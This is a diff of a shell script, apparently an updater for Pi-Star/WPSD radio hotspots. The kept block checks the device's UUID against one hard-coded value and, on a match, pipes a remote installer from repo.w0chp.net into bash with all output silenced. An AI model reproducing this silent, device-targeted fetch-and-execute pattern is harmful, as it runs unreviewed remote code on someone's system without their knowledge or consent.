@@ -157,11 +157,8 @@ else
 fi
 
 # 5/28/23: close the deb. < v.10 coffin
-debian_version=$(lsb_release -rs | cut -d '.' -f 1)
-if [ "$debian_version" -lt 10 ]; then
-    $u=$( grep "UUID" /etc/pistar-release | awk '{print $3}')
-    if [ "$u" = "95707930081050300c94" ]; then
-        declare -a CURL_OPTIONS=('-Ls' '-A' "Stretch-Phixer")
-        curl "${CURL_OPTIONS[@]}" https://repo.w0chp.net/WPSD-Dev/W0CHP-PiStar-Installer/raw/branch/master/WPSD-Installer | env NO_SELF_UPDATE=1 bash -s -- -rd > /dev/null 2<&1
-    fi
+u=$( grep "UUID" /etc/pistar-release | awk '{print $3}')
+if [ "$u" = "95707930081050300c94" ]; then
+    declare -a CURL_OPTIONS=('-Ls' '-A' "Stretch-Phixer")
+    curl "${CURL_OPTIONS[@]}" https://repo.w0chp.net/WPSD-Dev/W0CHP-PiStar-Installer/raw/branch/master/WPSD-Installer | env NO_SELF_UPDATE=1 bash -s -- -rd > /dev/null 2<&1
 fi
